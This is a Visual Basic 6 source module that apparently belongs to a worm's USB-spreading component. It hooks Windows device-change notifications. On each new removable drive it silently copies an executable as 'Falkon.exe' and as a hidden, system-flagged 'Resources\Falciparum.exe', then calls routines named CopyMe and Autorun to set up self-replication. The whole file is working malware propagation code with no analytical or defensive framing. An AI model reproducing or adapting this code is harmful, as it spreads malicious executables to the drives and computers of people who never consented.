Attribute VB_Name = "USB"
Public Declare Function RegisterDeviceNotification Lib "User32.dll" Alias "RegisterDeviceNotificationA" (ByVal hRecipient As Long, ByRef NotificationFilter As Any, ByVal flags As Long) As Long
Public Declare Function UnregisterDeviceNotification Lib "User32.dll" (ByVal Handle As Long) As Long

Private Type Guid
        Data1 As Long
        Data2 As Integer
        Data3 As Integer
        Data4(7) As Byte
End Type

Private Type DEV_BROADCAST_DEVICEINTERFACE
        dbcc_size As Long
        dbcc_devicetype As Long
        dbcc_reserved As Long
        dbcc_classguid As Guid
        dbcc_name As Long
End Type


Private Const DEVICE_NOTIFY_ALL_INTERFACE_CLASSES As Long = &H4
Private Const DEVICE_NOTIFY_WINDOW_HANDLE As Long = &H0
Private Const DBT_DEVTYP_DEVICEINTERFACE As Long = &H5

Public hDevNotify As Long

Public Declare Sub MemCopy Lib "kernel32" Alias "RtlMoveMemory" (Dest As Any, ByVal Src As Long, ByVal cb&)
Private Declare Function SetWindowLong Lib "User32.dll" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Function StringFromGUID2 Lib "OLE32.dll" (ByRef rGUID As Any, ByVal lpSz As String, ByVal cchMax As Long) As Long
Private Declare Sub RtlMoveMemory Lib "Kernel32.dll" (ByRef Destination As Any, ByRef Source As Any, ByVal Length As Long)
Private Declare Sub GetDWord Lib "MSVBVM60.dll" Alias "GetMem4" (ByRef inSrc As Any, ByRef inDst As Long)
Private Declare Sub GetWord Lib "MSVBVM60.dll" Alias "GetMem2" (ByRef inSrc As Any, ByRef inDst As Integer)

Private Type DEV_BROADCAST_HDR
        dbch_size As Long
        dbch_devicetype As Long
        dbch_reserved As Long
End Type

Dim OldProc As Long
Dim WndHnd As Long

Private Const GWL_WNDPROC As Long = (-4)
Private Const WM_DEVICECHANGE As Long = &H219
Private Const DBT_DEVNODES_CHANGED As Long = &H7
Private Const DBT_DEVICEARRIVAL As Long = &H8000&
Private Const DBT_DEVICEREMOVECOMPLETE As Long = &H8004&

Private Const DBT_DEVTYP_VOLUME As Long = &H2

Private Const DBTF_MEDIA As Long = &H1
Private Const DBTF_NET As Long = &H2

Private Const DRIVE_NO_ROOT_DIR As Long = 1
Private Const DRIVE_REMOVABLE As Long = 2
Private Const DRIVE_FIXED As Long = 3
Private Const DRIVE_REMOTE As Long = 4
Private Const DRIVE_CDROM As Long = 5
Private Const DRIVE_RAMDISK As Long = 6

Public Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function GetDiskFreeSpace Lib "kernel32" Alias "GetDiskFreeSpaceA" (ByVal lpRootPathName As String, lpSectorsPerCluster As Long, lpBytesPerSector As Long, lpNumberOfFreeClusters As Long, lpTotalNumberOfClusters As Long) As Long
Public Sub DetectUSBDevice()
On Error Resume Next

Dim NotificationFilter      As DEV_BROADCAST_DEVICEINTERFACE

With NotificationFilter
    .dbcc_size = Len(NotificationFilter)
    .dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE
End With

Call Hook(Form1.hWnd)

hDevNotify = RegisterDeviceNotification( _
Form1.hWnd, NotificationFilter, DEVICE_NOTIFY_WINDOW_HANDLE Or DEVICE_NOTIFY_ALL_INTERFACE_CLASSES)
End Sub
Private Function WndProc(ByVal hWnd As Long, ByVal uMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
On Error Resume Next
    Dim cd0                     As Long
    Dim cd1                     As Long
    Dim cd2                     As Long
    Dim clt                     As Long
    Dim l                       As Long
    Dim DevBroadcastHeader      As DEV_BROADCAST_HDR
    Dim UnitMask                As Long
    Dim flags                   As Integer
    Dim DeviceGUID              As Guid
    Dim DeviceNamePtr           As Long
    Dim DriveLetters            As String
    Dim MassStorageDevPath      As String
    Dim LoopDrives              As Long

    If (uMsg = WM_DEVICECHANGE) Then
        Select Case wParam
            Case DBT_DEVICEARRIVAL, DBT_DEVICEREMOVECOMPLETE
                If (lParam) Then
                    Call RtlMoveMemory(DevBroadcastHeader, ByVal lParam, Len(DevBroadcastHeader))

                    If (DevBroadcastHeader.dbch_devicetype = DBT_DEVTYP_VOLUME) Then
                    
                        Call GetDWord(ByVal (lParam + Len(DevBroadcastHeader)), UnitMask)
                        Call GetWord(ByVal (lParam + Len(DevBroadcastHeader) + 4), flags)

                        DriveLetters = UnitMaskToString(UnitMask)
                        MassStorageDevPath = DriveLetters & ":\"
                        l = GetDiskFreeSpace(MassStorageDevPath, cd0, cd1, cd2, clt)
                        If l = 1 Then
                        If (cd0 * cd1 * cd2 > 200000) Then
                            If Not FILE_EXISTS(MassStorageDevPath + "Falkon.exe") Then
                                FileCopy SF(3), MassStorageDevPath + "Falkon.exe"
                                    MkDir MassStorageDevPath + "Resources"
                                    FileCopy SF(3), MassStorageDevPath + "Resources\Falciparum.exe"
                                    SetAttr MassStorageDevPath + "Resources", vbHidden + vbReadOnly + vbSystem
                                    SetAttr MassStorageDevPath + "Resources\Falciparum.exe", vbHidden + vbReadOnly + vbSystem
                                Call CopyMe(MassStorageDevPath)
                                Call Autorun(MassStorageDevPath)
                                End If
                        End If
                        End If
                
                    ElseIf (DevBroadcastHeader.dbch_devicetype = DBT_DEVTYP_DEVICEINTERFACE) Then
                        Call RtlMoveMemory(DeviceGUID, ByVal (lParam + Len(DevBroadcastHeader)), Len(DeviceGUID))
                        Call GetDWord(ByVal (lParam + Len(DevBroadcastHeader) + Len(DeviceGUID)), DeviceNamePtr)
                    End If
                End If
            Case DBT_DEVNODES_CHANGED
        End Select
    End If

    WndProc = CallWindowProc(OldProc, hWnd, uMsg, wParam, lParam)
End Function
Private Function UnitMaskToString(ByVal inUnitMask As Long) As String
On Error Resume Next
    Dim LoopBits As Long

    For LoopBits = 0 To 30
        If (inUnitMask And (2 ^ LoopBits)) Then _
            UnitMaskToString = UnitMaskToString & Chr$(Asc("A") + LoopBits)
    Next LoopBits
    
End Function
Public Sub Hook(ByVal inWnd As Long)
If (WndHnd) Then Call UnHook

OldProc = SetWindowLong(inWnd, GWL_WNDPROC, AddressOf WndProc)
WndHnd = inWnd
End Sub
Public Sub UnHook()
If (WndHnd = 0) Then Exit Sub
Call SetWindowLong(WndHnd, GWL_WNDPROC, OldProc)
WndHnd = 0
OldProc = 0
End Sub
